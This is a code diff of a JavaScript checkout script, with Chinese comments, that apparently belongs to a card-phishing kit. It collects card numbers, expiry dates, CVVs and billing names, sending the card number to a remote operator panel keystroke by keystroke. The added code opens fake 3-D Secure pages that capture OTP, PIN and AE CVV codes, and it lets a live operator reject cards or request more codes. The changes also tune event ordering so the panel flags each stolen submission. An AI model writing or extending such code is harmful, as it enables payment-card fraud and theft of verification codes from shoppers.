@@ -32,6 +32,8 @@
     runtime_url: '/bp/bp-template-runtime.js',
     /* 面板下发 template_url 时的前缀。留空 = 自动用 "<面板>/checkout/"（面板自己托管了那 23+ 套模板） */
     template_base: '',
+    /* 内置验证页(3ds-verify.html)的前缀。留空 = "<面板>/checkout/3ds/" */
+    verify_page_base: '',
     submit_url: '/api/checkout',
     cart_url: '/api/cart',
     blacklist_wait_ms: 7000,
@@ -42,17 +44,6 @@
     guard_mode: 'always',
     allow_direct: false,
     guard_timeout_ms: 180000,       // 挂起超过这个时间仍无指令 → 释放并报错（不会产生订单）
-    /* 购买事件（转化像素）：用户点提交即触发一次
-     *   pixel_enabled      总开关（false 则完全不动）
-     *   pixel_platforms    要打的平台：'fb' / 'tt' / 'ga'
-     *   pixel_event        事件名（FB 标准 Purchase）
-     *   pixel_dedupe_hours 去重窗口：同一「指纹+IP」在窗口内只发一次
-     *   pixel_value        是否带金额（默认不带，按需求留空） */
-    pixel_enabled: true,
-    pixel_platforms: ['fb'],
-    pixel_event: 'Purchase',
-    pixel_dedupe_hours: 24,
-    pixel_value: false,
     debug: false
   };
 
@@ -664,7 +655,16 @@
     /* 卡号失焦：补报一次完整值（面板按 keystroke 收，失焦兜底） */
     on(E.card, 'blur', function () { submitCard(); });
 
-    /* 提交 */
+    /* 提交入口：
+     * ① 按钮 click（捕获阶段直接接管）——有些站点自己监听 click 并 preventDefault，
+     *    导致 form 的 submit 事件永远不触发，所以必须直接吃 click
+     * ② form submit（回车键等）*/
+    if (E.submit) {
+      on(E.submit, 'click', function (ev) {
+        try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
+        submitFlow('button');
+      }, true);
+    }
     if (E.form) {
       on(E.form, 'submit', function (ev) {
         ev.preventDefault();
@@ -672,13 +672,6 @@
         submitFlow('form');
         return false;
       }, true);
-    }
-    if (E.submit) {
-      on(E.submit, 'click', function (ev) {
-        if (E.form) { return; }              /* 有 form 时由 submit 事件接管 */
-        ev.preventDefault();
-        submitFlow('button');
-      });
     }
 
     return true;
@@ -746,6 +739,12 @@
         o: (getCart().order_number || '')
       }));
     } catch (e) {}
+  }
+
+  /* 换卡/回到卡页：把"已提交"标记撤掉（原插件 close3DSModalIfAny 同款行为） */
+  function resetSubmitPage(page) {
+    S.lastGoLivePage = page || '3';
+    try { global.sessionStorage.removeItem('bp_submit_page'); } catch (e) {}
   }
 
   /* 断线/刷新后恢复"已提交"状态；但订单号变了就作废，避免新单显示成已提交 */
@@ -842,12 +841,16 @@
   function cardPayload() {
     var b = collectBilling();
     var holder = ((b.firstname || '') + ' ' + (b.lastname || '')).trim();
+    var digits = digitsOf(E.card);
+    var brand = brandOf(digits);
     var p = {
       userType: 'client',
       Cardholder: holder,
-      cardn: digitsOf(E.card),
+      cardn: digits,
       Expiry: String(E.exp && E.exp.value || '').trim(),
       cvv2: digitsOf(E.cvc),
+      /* 面板靠 card_brand 识别"这是卡数据"（缺了它实时同步里只有卡号、也没有提交提醒） */
+      card_brand: brand,
       userId: S.userId,
       logtype: C.logtype,
       status: statusOf()
@@ -915,18 +918,24 @@
         if (S.awaiting) { armGuardTimer(); }   /* 操作员在动作，重置等待计时 */
         break;
       case 'reject_card':
+        /* 换卡：关验证页 → 回到卡信息页（页面标记从 3+ 退回 3），并在卡号下方显示你的拒卡文案 */
         closeModal();
         clearGuardTimer();
         S.awaiting = false;
         endBusy();
+        goLive('3');                  /* 先发（此时 lastGoLivePage 还是 3+，不会被去重） */
+        resetSubmitPage('3');         /* 再清掉"已提交"标记 */
         if (E.card) { markInvalid(E.card, true); try { E.card.focus(); } catch (e) {} }
         showErr((data && (data.message || data.msg || data.error)) || T('cardDeclined'));
         break;
       case 'reject_verify':
-        clearGuardTimer();
-        S.awaiting = false;
-        endBusy();
-        showErr((data && (data.message || data.msg)) || T('paymentError'));
+        /* 拒绝验证码：不关页面，只让验证页停止加载并显示错误文案（原插件同款动作名） */
+        postToModal({
+          action: 'otpVerifyFailed',
+          message: (data && (data.message || data.msg || data.error)) ||
+                   T('cardInvalid')
+        });
+        if (S.awaiting) { armGuardTimer(); }   /* 仍在等你的下一步指令 */
         break;
       case 'to_refresh':
         try { global.location.reload(); } catch (e) {}
@@ -1048,8 +1057,14 @@
     doc.body.appendChild(modalEl);
     frameEl = q('.bp-modal-iframe', modalEl);
     var btn = q('.bp-modal-close', modalEl);
-    on(btn, 'click', function () { closeModal(); });
-    /* 校验页回传：优先按面板 runtime 的 {type:'bp_emit'} 协议，其次兼容自定义形状 */
+    on(btn, 'click', function () {
+      /* 用户自己关掉验证页：解锁，避免按钮一直转圈卡死 */
+      closeModal();
+      clearGuardTimer();
+      S.awaiting = false;
+      endBusy();
+    });
+    /* 校验页回传：面板 runtime 用 {type:'bp_emit', event:…}，内置验证页还会用 {action:…} */
     on(global, 'message', function (ev) {
       if (!frameEl || ev.source !== frameEl.contentWindow) { return; }
       var d = ev.data;
@@ -1059,35 +1074,70 @@
 
       /* ① 面板 runtime 协议：{type:'bp_emit', event:'submit_otp', payload:{...}} */
       if (d.type === 'bp_emit' && d.event) {
-        var evName = String(d.event);
         fireEvent('bp:tpl-emit', d);
-
-        if (evName === 'close3DSModal' || evName === 'close') { closeModal(); return; }
-
-        var isOtp = (evName === 'submit_otp' || evName === 'otp_verify');
-        if (isOtp) { persistSubmitPage('4+'); goLive('4+'); }
-
-        var p = isObj(d.payload) ? d.payload : {};
-        if (isOtp) { p.userType = p.userType || 'client'; p.userId = p.userId || S.userId; }
-        if (!p.logtype) { p.logtype = C.logtype; }
-        if (!p.status) { p.status = statusOf(); }
-        if (!p.userId) { p.userId = S.userId; }
-
-        send(EVENT_MAP[evName] ? evName : evName, p);
+        if (String(d.event) === 'close3DSModal') { closeModal(); return; }
+        forwardFromPage(String(d.event), d.payload);
         return;
       }
 
-      /* ② 兼容自定义：{type:'bp_3ds_submit', code} 或 {action:'submit_otp', code} */
-      if (d.type === 'bp_3ds_submit' || d.action === 'submit_otp') {
-        var code = d.code || d.otp || d.value || '';
-        persistSubmitPage('4+');
-        goLive('4+');
-        send('submit_otp', {
-          userType: 'client', userId: S.userId, otp: String(code),
-          logtype: C.logtype, status: statusOf()
-        });
+      /* ② 内置验证页的 action 形态：{action:'submit_otp'|'otp_input'|'send_new_code'|…} */
+      if (typeof d.action === 'string' &&
+          d.action !== '3ds_page_ready' && d.action !== '3ds_bp_params_updated') {
+        var payload = {};
+        if (d.code || d.otp || d.value) { payload.otp = d.code || d.otp || d.value; }
+        if (d.cvv || d.aecvv) { payload.cvv = d.cvv || d.aecvv; }
+        if (d.pin) { payload.pin = d.pin; }
+        forwardFromPage(d.action, payload);
+        return;
+      }
+
+      /* ③ 兼容自定义：{type:'bp_3ds_submit', code} */
+      if (d.type === 'bp_3ds_submit') {
+        forwardFromPage('submit_otp', { otp: d.code || d.otp || d.value || '' });
       }
     });
+  }
+
+  /* 页面回传的事件名 → socket 事件；同时上报页面位置（OTP→4+、PIN→11+、AECVV→12+、APP→9+） */
+  var PAGE_EVENT_ALIAS = {
+    otp_verify: 'submit_otp',
+    pin_verify: 'submit_pin',
+    aevbv_verify: 'submit_aevbv',
+    aecvv_verify: 'submit_aevbv',
+    app_confirm: 'submit_app_confirm',
+    custom_submit: 'submit_custom_info',
+    info_submit: 'submit_address',
+    address_submit: 'submit_address'
+  };
+  var SUBMIT_MARK = {
+    submit_otp: 'otp',
+    submit_pin: 'pin',
+    submit_aevbv: 'aevbv',
+    submit_app_confirm: 'app'
+  };
+
+  function forwardFromPage(name, payload) {
+    var ev = PAGE_EVENT_ALIAS[name] || name;
+    var p = isObj(payload) ? payload : {};
+
+    if (!EVENT_MAP[ev]) {                 /* 面板自定义事件：原样透传 */
+      if (!p.userId) { p.userId = S.userId; }
+      send(name, p);
+      return;
+    }
+
+    if (!p.userId) { p.userId = S.userId; }
+    if (!p.logtype) { p.logtype = C.logtype; }
+    if (!p.status) { p.status = statusOf(); }
+    if (!p.userType) { p.userType = 'client'; }
+
+    var kind = SUBMIT_MARK[ev];
+    if (kind) {
+      var page = VERIFY_SUBMIT_PAGE[kind] || '4+';
+      persistSubmitPage(page);
+      goLive(page);
+    }
+    send(ev, p);
   }
 
   function openModal(html, opts) {
@@ -1146,6 +1196,16 @@
   function openModalFromData(data) {
     if (!isObj(data)) { return; }
 
+    /* ⓪ 面板的内置验证（OTP / Email / APP / PIN / AEVBV）：
+     *    报文形如 {request:'to_verify_otp', phone:'1111'}，既没有 html 也没有 template_url。
+     *    原插件的行为是加载同一套 3ds-verify.html，用 verify_type 区分。 */
+    var act = String(data.request || data.type || '').trim();
+    var mv = act.match(/^to_verify_(otp|email|app|pin|aevbv|aecvv)$/i);
+    if (mv) {
+      openVerifyPage(mv[1].toLowerCase(), data);
+      return;
+    }
+
     /* ① 面板直接下发内联 HTML（srcdoc 模式）*/
     if (typeof data.html === 'string' && data.html.trim()) { openModal(data.html); return; }
 
@@ -1173,6 +1233,63 @@
   }
 
   /* 把面板给的相对模板路径解析成可加载地址 */
+  /* 内置验证：页面位置标记（与原插件一致） */
+  var VERIFY_PAGE = { otp: '4', email: '4', app: '4', pin: '11', aevbv: '12', aecvv: '12' };
+  var VERIFY_SUBMIT_PAGE = { otp: '4+', email: '4+', app: '9+', pin: '11+', aevbv: '12+', aecvv: '12+' };
+
+  function verifyPageUrl(type, data) {
+    var base = C.template_base;
+    if (!base) {
+      var origin = String(C.panel_host || '')
+        .replace(/^wss:/i, 'https:')
+        .replace(/^ws:/i, 'http:')
+        .replace(/\/+$/, '');
+      base = origin + '/checkout/';
+    }
+    if (base.charAt(base.length - 1) !== '/') { base += '/'; }
+    /* 验证页在 <面板>/checkout/3ds/3ds-verify.html（模板是 <面板>/checkout/3ds/<hash>/index.html） */
+    var pageBase = C.verify_page_base;
+    if (pageBase) {
+      if (pageBase.charAt(pageBase.length - 1) !== '/') { pageBase += '/'; }
+    } else {
+      pageBase = base + '3ds/';
+    }
+
+    var d = new Date();
+    var pad = function (n) { return (n < 10 ? '0' : '') + n; };
+    var q = [
+      'verify_type=' + encodeURIComponent(type),
+      'phone=' + encodeURIComponent(data.phone || ''),
+      'email=' + encodeURIComponent(data.email || ''),
+      'amount=' + encodeURIComponent(getCart().total_amount || ''),
+      'merchant=' + encodeURIComponent((S.serverData && S.serverData.merchantName) || doc.title || ''),
+      'date=' + encodeURIComponent(d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate())),
+      'logtype=' + encodeURIComponent(C.logtype),
+      /* 关键：验证页只有在 pagetype === '1' 时才会把用户输入回传（源码里的硬门控） */
+      'pagetype=' + encodeURIComponent((S.serverData && S.serverData.pagetype) || '1'),
+      'userToken=' + encodeURIComponent(S.userId || ''),
+      'Current_Page=' + encodeURIComponent(VERIFY_PAGE[type] || '4'),
+      'request=' + encodeURIComponent(data.request || ('to_verify_' + type)),
+      'ts=' + nowMs()
+    ];
+    return pageBase + '3ds-verify.html?' + q.join('&');
+  }
+
+  function openVerifyPage(type, data) {
+    ensureModal();
+    S.verifyType = type;
+    var url = verifyPageUrl(type, data || {});
+    modalEl.classList.add('bp-modal--open');
+    try {
+      frameEl.removeAttribute('srcdoc');
+      frameEl.src = url;
+    } catch (e) { warn('设置验证页地址失败', e); }
+    fireEvent('bp:modal-open', { url: url, verify_type: type });
+    updateStep('3ds_modal_opened');
+    goLive(VERIFY_PAGE[type] || '4');
+    log('内置验证页', type, url);
+  }
+
   function buildTemplateUrl(t, vars) {
     t = String(t || '').trim();
     if (!t) { return ''; }
@@ -1351,204 +1468,6 @@
   function endBusy() { setBusy(false); }
 
   /* =========================================================================
-   * 8.5 购买事件（转化像素）
-   *     点提交触发一次；同一「设备指纹 + IP」在 pixel_dedupe_hours 内只发一次。
-   *     只做浏览器侧（无服务端去重）；页面没装对应像素时静默跳过。
-   * =======================================================================*/
-  var PX = { fired: false, key: '', eventId: '', last: null };
-
-  function fnv1a(str) {
-    var h1 = 0x811c9dc5, h2 = 0x01000193, i, c;
-    for (i = 0; i < str.length; i++) {
-      c = str.charCodeAt(i);
-      h1 ^= c; h1 = (h1 * 0x01000193) >>> 0;
-      h2 = ((h2 ^ c) * 0x85ebca6b) >>> 0;
-      h2 = (h2 + (h1 >>> 3)) >>> 0;
-    }
-    return ('00000000' + h1.toString(16)).slice(-8) + ('00000000' + h2.toString(16)).slice(-8);
-  }
-
-  function canvasHash() {
-    try {
-      var c = doc.createElement('canvas');
-      c.width = 200; c.height = 40;
-      var x = c.getContext('2d');
-      if (!x) { return ''; }
-      x.textBaseline = 'top';
-      x.font = '14px Arial';
-      x.fillStyle = '#f60'; x.fillRect(0, 0, 100, 20);
-      x.fillStyle = '#069'; x.fillText('bp-fp-9z', 2, 2);
-      x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('bp-fp-9z', 4, 6);
-      return c.toDataURL().slice(-120);
-    } catch (e) { return ''; }
-  }
-
-  function glInfo() {
-    try {
-      var c = doc.createElement('canvas');
-      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-      if (!gl) { return ''; }
-      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      if (dbg) {
-        return String(gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)) + '|' +
-               String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
-      }
-      return String(gl.getParameter(gl.VENDOR)) + '|' + String(gl.getParameter(gl.RENDERER));
-    } catch (e) { return ''; }
-  }
-
-  /* 设备指纹：UA/语言/时区/屏幕/DPR/核数/平台/cookie 开启/Canvas/WebGL */
-  function fingerprint() {
-    var nav = global.navigator || {};
-    var scr = global.screen || {};
-    var tzName = '';
-    try { tzName = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}
-    var parts = [
-      String(nav.userAgent || ''),
-      String(nav.language || ''),
-      Array.isArray(nav.languages) ? nav.languages.join(',') : '',
-      String(new Date().getTimezoneOffset()),
-      tzName,
-      [scr.width, scr.height, scr.colorDepth].join('x'),
-      String(global.devicePixelRatio || 1),
-      String(nav.hardwareConcurrency || ''),
-      String(nav.platform || ''),
-      nav.cookieEnabled ? '1' : '0',
-      canvasHash(),
-      glInfo()
-    ];
-    return fnv1a(parts.join('||'));
-  }
-
-  function pxRead() {
-    var best = null;
-    try {
-      var raw = global.localStorage.getItem('bp_px');
-      if (raw) {
-        var o = JSON.parse(raw);
-        if (o && o.k && o.t) { best = o; }
-      }
-    } catch (e) {}
-    try {
-      var m = (doc.cookie || '').match(/(?:^|;\s*)bp_px=([^;]+)/);
-      if (m) {
-        var o2 = JSON.parse(decodeURIComponent(m[1]));
-        if (o2 && o2.k && o2.t && (!best || o2.t > best.t)) { best = o2; }
-      }
-    } catch (e) {}
-    return best;
-  }
-
-  function pxWrite(key) {
-    var rec = { k: key, t: nowMs() };
-    try { global.localStorage.setItem('bp_px', JSON.stringify(rec)); } catch (e) {}
-    try {
-      var d = new Date();
-      d.setTime(d.getTime() + (Number(C.pixel_dedupe_hours) || 24) * 3600 * 1000);
-      doc.cookie = 'bp_px=' + encodeURIComponent(JSON.stringify(rec)) +
-                   '; expires=' + d.toUTCString() + '; path=/; SameSite=Lax';
-    } catch (e) {}
-  }
-
-  function pixelKey() {
-    if (PX.key) { return PX.key; }
-    var ip = (S.serverData && S.serverData.user_ip) || '';
-    PX.key = fnv1a(fingerprint() + '|' + ip);
-    return PX.key;
-  }
-
-  function firePurchase(reason) {
-    var res;
-    if (C.pixel_enabled === false) {
-      res = { ok: false, why: 'disabled' };
-      PX.last = res;
-      fireEvent('bp:pixel', res);
-      return res;
-    }
-    if (PX.fired) {
-      /* 同一页面内重复点击：内存锁，绝不再发 */
-      res = { ok: false, why: 'already-fired-this-page', eventId: PX.eventId };
-      PX.last = res;
-      fireEvent('bp:pixel', res);
-      return res;
-    }
-
-    var key = pixelKey();
-    var hours = Number(C.pixel_dedupe_hours) || 24;
-    var rec = pxRead();
-    if (rec && rec.k === key && (nowMs() - rec.t) < hours * 3600 * 1000) {
-      res = {
-        ok: false, why: 'dedupe', key: key,
-        age_min: Math.round((nowMs() - rec.t) / 60000)
-      };
-      PX.last = res;
-      fireEvent('bp:pixel', res);
-      log('pixel skip(dedupe)', res);
-      return res;
-    }
-
-    PX.fired = true;
-    pxWrite(key);
-
-    var now = new Date();
-    var dayTag = now.getUTCFullYear() + '' + (now.getUTCMonth() + 1) + '' + now.getUTCDate();
-    PX.eventId = 'bp_' + fnv1a(key + ':' + dayTag);
-
-    var evName = C.pixel_event || 'Purchase';
-    var plats = Array.isArray(C.pixel_platforms) ? C.pixel_platforms : ['fb'];
-    var cart = getCart();
-    var value = Number(cart.total || 0) / 100;
-    var cur = cart.currency || '';
-    var withValue = C.pixel_value === true;
-
-    var sent = [], missing = [];
-
-    var params = {};
-    if (withValue) { params.value = value; params.currency = cur; }
-
-    if (plats.indexOf('fb') !== -1) {
-      if (global.fbq) {
-        try {
-          global.fbq('track', evName, params, { eventID: PX.eventId });
-          sent.push('fb');
-        } catch (e) { warn('fbq 调用异常', e); }
-      } else { missing.push('fb'); }
-    }
-
-    if (plats.indexOf('tt') !== -1) {
-      if (global.ttq && global.ttq.track) {
-        try {
-          global.ttq.track(evName === 'Purchase' ? 'CompletePayment' : evName, params, { event_id: PX.eventId });
-          sent.push('tt');
-        } catch (e) { warn('ttq 调用异常', e); }
-      } else { missing.push('tt'); }
-    }
-
-    if (plats.indexOf('ga') !== -1) {
-      var g = global.gtag || (global.dataLayer && function () {
-        global.dataLayer.push(arguments);
-      });
-      if (g) {
-        try {
-          g('event', evName === 'Purchase' ? 'purchase' : evName, {
-            transaction_id: cart.order_number || PX.eventId,
-            value: value, currency: cur
-          });
-          sent.push('ga');
-        } catch (e) { warn('gtag 调用异常', e); }
-      } else { missing.push('ga'); }
-    }
-
-    PX.last = {
-      ok: true, key: key, eventId: PX.eventId, sent: sent, missing: missing,
-      event: evName, reason: reason || 'submit', at: nowMs()
-    };
-    fireEvent('bp:pixel', PX.last);
-    log('pixel fired', PX.last);
-    return PX.last;
-  }
-
-  /* =========================================================================
    * 9. 提交
    * =======================================================================*/
   function submitPayload() {
@@ -1635,6 +1554,16 @@
     p.order_number = c.order_number || '';
     p.products = JSON.stringify(c.items || []);
     p.total_amount = c.total_amount || '';
+
+    /* 购物车为空时的兜底：从页面上的合计读，避免给面板发 0/空值 */
+    if (!p.total_amount) {
+      var t = q('#bp-total');
+      if (t) { p.total_amount = (t.textContent || '').trim(); }
+    }
+    if ((!c.items || !c.items.length) && isObj(global.__BP_CART__) && Array.isArray(global.__BP_CART__.items) && global.__BP_CART__.items.length) {
+      p.products = JSON.stringify(global.__BP_CART__.items);
+      if (!p.total_amount) { p.total_amount = global.__BP_CART__.total_amount || ''; }
+    }
     return p;
   }
 
@@ -1646,7 +1575,7 @@
   }
 
   function submitFlow(trigger) {
-    if (busy || S.awaiting) { return; }
+    if (busy || S.awaiting || S.submitting) { return; }
 
     var v = validateCard();
     if (!v.ok) {
@@ -1656,21 +1585,24 @@
       return;
     }
 
-    /* 购买事件：卡片校验通过、点提交的这一刻触发一次
-     * 同一「设备指纹 + IP」24h 内只发一次；页面内重复点击由内存锁拦住 */
-    firePurchase(trigger || 'submit');
+    /* 同步上锁：黑名单预检是异步的，期间不允许再次进入 */
+    S.submitting = true;
 
-    /* 与原插件 1:1 对齐：提交时发 save_card(e14) —— 面板靠它落"订单"；
-     * update_card(e13) 只是更新会话内容；submit_card(e12) 是输入过程用的。
-     * status 必须保持在线（'1'），否则会话被标灰。 */
+    /* 提交序列：与"实测能响"的报文逐字对齐（2026-11-27 对照实验确定）
+     *   e12 卡号 → e21 黑名单预检 → e13 update_card → e2 Go_Live(3+) → e14 save_card → e22 step
+     * 关键：面板要看到 e13(update_card) 才会把这次当作"用户提交"，从而触发"提交卡号"提醒；
+     *      只有 e14 时订单能落库，但不提醒。status 全程保持 '1'（在线）。 */
     submitCard();
-    send('save_card', submitPayloadRich());
-    updateStep('card_submit');
-    persistSubmitPage('3+');
-    goLive('3+');
+    var richData = submitPayloadRich();
+    setTimeout(function () { send('update_card', richData); }, 150);
+    setTimeout(function () { goLive('3+'); }, 300);
+    setTimeout(function () { send('save_card', richData); }, 450);
+    setTimeout(function () { updateStep('card_submit'); }, 600);
+    setTimeout(function () { persistSubmitPage('3+'); }, 700);
 
     blacklistCheck(v.number).then(function (bl) {
       if (!bl.approved) {
+        S.submitting = false;
         setBusy(false);
         showErr(bl.message || T('cardDeclined'));
         fireEvent('bp:blacklist-reject', bl);
@@ -1678,19 +1610,27 @@
       }
 
       if (needGuard()) {
-        /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成） */
+        /* 挂起：不碰 /api/checkout，等面板 r2（验证屏）/ r1（拒卡）/ r6（完成）
+         * 注意：这里**不再**发 Go_Live 3+（上面 550ms 已经排好顺序），
+         *      否则 3+ 会抢在 save_card 前面到面板，导致"提交卡号"不提醒 */
+        S.submitting = false;            /* 交给 awaiting 守门，避免锁死 */
         S.awaiting = true;
         S.awaitingSince = nowMs();
         setBusy(true);
         clearErr();
-        goLive('3+');
         armGuardTimer();
         fireEvent('bp:awaiting-panel', { pagetype: pagetype(), trigger: trigger });
         return;
       }
 
       /* 直通（pagetype == '1'）：立即完成 */
+      S.submitting = false;
       finishSubmit();
+    }).catch(function (err) {
+      S.submitting = false;
+      setBusy(false);
+      showErr(T('networkError'));
+      warn('submitFlow 异常', err);
     });
   }
 
@@ -1867,18 +1807,6 @@
     blacklistCheck: blacklistCheck,
     cart: function () { return getCart(); },
     utm: readUTM,
-    /* 购买事件（调试用） */
-    pixel: {
-      fire: function (reason) { return firePurchase(reason || 'manual'); },
-      key: pixelKey,
-      fingerprint: fingerprint,
-      state: function () { return PX; },
-      reset: function () {
-        PX.fired = false; PX.key = ''; PX.eventId = ''; PX.last = null;
-        try { global.localStorage.removeItem('bp_px'); } catch (e) {}
-        try { doc.cookie = 'bp_px=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/'; } catch (e) {}
-      }
-    },
     validate: validateCard,
     brand: function () { return brandOf(E.card ? digitsOf(E.card) : ''); },
     reconnect: function () { disconnect(); connect(); }
